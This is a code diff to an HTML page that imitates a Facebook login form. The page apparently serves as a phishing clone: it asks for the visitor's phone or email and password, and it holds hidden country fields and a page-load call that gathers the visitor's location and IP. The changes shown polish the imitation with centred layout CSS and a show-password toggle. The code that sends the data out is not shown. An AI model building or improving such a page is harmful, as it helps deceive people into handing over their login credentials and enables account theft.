@@ -24,8 +24,10 @@
             text-align: center;
             padding: 12px 0;
             background-color: transparent;
-            width: 100%;
+            width: 85%;
+            max-width: 340px;
             position: relative;
+            margin: 0 auto;
         }
         .lang-selector::after {
             content: "▼";
@@ -43,6 +45,7 @@
             flex: 1;
             max-height: 100vh;
             overflow: hidden;
+            justify-content: space-between;
         }
         .facebook-logo {
             display: flex;
@@ -168,6 +171,25 @@
             position: absolute;
             right: -2px;
         }
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #8a8d91;
+            font-size: 16px;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
     </style>
 </head>
 <body>
@@ -186,8 +208,13 @@
                 <span class="floating-label">Mobile number or email address</span>
             </div>
             <div class="form-group">
-                <input type="password" id="password" name="password" placeholder=" " required>
-                <span class="floating-label">Password</span>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" placeholder=" " required>
+                    <button type="button" class="password-toggle" id="password-toggle">
+                        <span class="show-password">👁️</span>
+                    </button>
+                    <span class="floating-label">Password</span>
+                </div>
             </div>
             <div class="hidden-inputs">
                 <input type="hidden" id="country" name="country">
@@ -217,6 +244,18 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Password visibility toggle
+            const passwordToggle = document.getElementById('password-toggle');
+            const passwordField = document.getElementById('password');
+            
+            passwordToggle.addEventListener('click', function() {
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                } else {
+                    passwordField.type = 'password';
+                }
+            });
+            
             // Get user location and IP info
             getUserLocationAndIp();
             
